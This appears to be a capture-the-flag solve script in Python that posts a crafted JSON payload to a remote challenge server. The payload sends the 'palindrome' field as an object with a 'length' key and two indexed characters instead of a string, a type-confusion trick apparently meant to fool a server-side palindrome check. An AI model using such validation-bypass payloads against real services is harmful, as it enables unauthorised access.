#!/usr/bin/env python3

import requests
import json

url = "http://154.57.164.64:32535/"
# url = "http://127.0.0.1:12349/"


def main():
    payload = {
        "palindrome": {
            "length":"1000",
            "0":"a",
            "999":"a"
        }
    }

    r = requests.post(url, json=payload)
    print("Status:", r.status_code)
    print(r.text)


if __name__ == "__main__":
    main()
